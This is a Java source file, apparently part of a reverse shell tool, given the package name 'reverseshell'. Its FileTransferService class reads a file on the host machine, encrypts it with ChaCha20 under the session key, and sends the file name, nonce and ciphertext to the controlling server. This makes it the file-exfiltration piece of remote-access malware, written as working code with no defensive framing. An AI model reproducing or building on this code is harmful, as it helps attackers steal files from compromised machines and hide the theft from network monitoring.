package obs1d1anc1ph3r.reverseshell.utils;

import java.io.File;
import java.nio.file.Files;
import obs1d1anc1ph3r.reverseshell.ServerConnection;
import obs1d1anc1ph3r.reverseshell.encryption.ChaCha20;

public class FileTransferService {

	public void sendEncryptedFile(File file, ServerConnection serverConnection) throws Exception {
		if (!file.exists() || !file.isFile()) {
			serverConnection.sendEncryptedResponse("Error: File not found: " + file.getAbsolutePath());
			return;
		}

		if (!file.canRead()) {
			serverConnection.sendEncryptedResponse("Error: File is not readable: " + file.getAbsolutePath());
			return;
		}

		byte[] fileBytes = Files.readAllBytes(file.toPath());
		byte[] nonce = ChaCha20.generateNonce();
		byte[] encryptedFileBytes = ChaCha20.encrypt(serverConnection.getSessionKey(), nonce, fileBytes);

		serverConnection.sendEncryptedResponse("file download");

		serverConnection.getDataOut().writeUTF(file.getName());

		serverConnection.getDataOut().writeInt(nonce.length);
		serverConnection.getDataOut().write(nonce);

		serverConnection.getDataOut().writeInt(encryptedFileBytes.length);
		serverConnection.getDataOut().write(encryptedFileBytes);
		serverConnection.getDataOut().flush();
	}
}
